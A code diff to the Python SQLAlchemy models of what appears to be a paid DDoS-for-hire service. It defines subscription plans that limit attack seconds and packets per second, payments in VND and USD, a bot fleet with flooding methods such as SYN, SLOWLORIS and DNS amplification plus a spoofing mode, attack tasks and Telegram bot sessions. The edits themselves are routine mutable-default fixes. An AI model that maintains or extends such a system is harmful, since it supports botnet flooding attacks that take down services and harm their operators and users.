@@ -6,7 +6,7 @@ from sqlalchemy.orm import relationship
 from app.database import Base
 
 def utcnow(): return datetime.now(timezone.utc)
-def new_uuid(): return str(uuid.uuid4())
+def new_uuid(): return uuid.uuid4()
 
 class User(Base):
     __tablename__ = "users"
@@ -38,7 +38,7 @@ class Plan(Base):
     max_attack_secs = Column(Integer, default=60)
     cooldown_secs = Column(Integer, default=300)
     max_pps_per_bot = Column(Integer, default=100000)
-    allowed_methods = Column(ARRAY(Text), default=[])
+    allowed_methods = Column(ARRAY(Text), default=list)
     price_vnd = Column(Integer, default=50000)
     price_usd = Column(DECIMAL(10,2), default=5.00)
     is_active = Column(Boolean, default=True)
@@ -67,7 +67,7 @@ class Payment(Base):
     status = Column(String(16), default="pending")
     tx_ref = Column(String(128), unique=True)
     payment_url = Column(Text)
-    meta = Column('metadata', JSONB, default={})
+    meta = Column('metadata', JSONB, default=dict)
     created_at = Column(DateTime(timezone=True), default=utcnow)
     completed_at = Column(DateTime(timezone=True))
     user = relationship("User", back_populates="payments")
@@ -91,7 +91,7 @@ class Bot(Base):
     max_pps = Column(Integer, default=100000)
     max_mbps = Column(Integer, default=500)
     max_threads = Column(Integer, default=100)
-    enabled_methods = Column(ARRAY(Text), default=["UDP","TCP","HTTP","SYN","ICMP","MIX","SLOWLORIS","TLS_EXHAUST","DNS_AMP","GAME_MIMIC","MEGA"])
+    enabled_methods = Column(ARRAY(Text), default=lambda: ["UDP","MEGA","SYN","TLS_EXHAUST","HTTP","SLOWLORIS","DNS_AMP"])
     spoof_mode = Column(Integer, default=0)
     fragmentation = Column(Boolean, default=False)
     last_heartbeat_at = Column(DateTime(timezone=True))
@@ -116,7 +116,7 @@ class AttackTask(Base):
     game_mimic = Column(Boolean, default=False)
     mega_mode = Column(Boolean, default=False)
     status = Column(String(16), default="pending")
-    bot_ids = Column(ARRAY(UUID), default=[])
+    bot_ids = Column(ARRAY(UUID), default=list)
     total_packets = Column(BigInteger, default=0)
     total_bytes = Column(BigInteger, default=0)
     started_at = Column(DateTime(timezone=True))
@@ -141,7 +141,7 @@ class AdminLog(Base):
     action = Column(String(128), nullable=False)
     target_type = Column(String(64))
     target_id = Column(UUID)
-    details = Column(JSONB, default={})
+    details = Column(JSONB, default=dict)
     created_at = Column(DateTime(timezone=True), default=utcnow)
 
 class TelegramSession(Base):
@@ -150,6 +150,6 @@ class TelegramSession(Base):
     user_id = Column(UUID, ForeignKey("users.id"), unique=True, nullable=False)
     chat_id = Column(BigInteger, nullable=False)
     state = Column(String(32), default="idle")
-    data = Column(JSONB, default={})
+    data = Column(JSONB, default=dict)
     created_at = Column(DateTime(timezone=True), default=utcnow)
     user = relationship("User", back_populates="telegram_session")
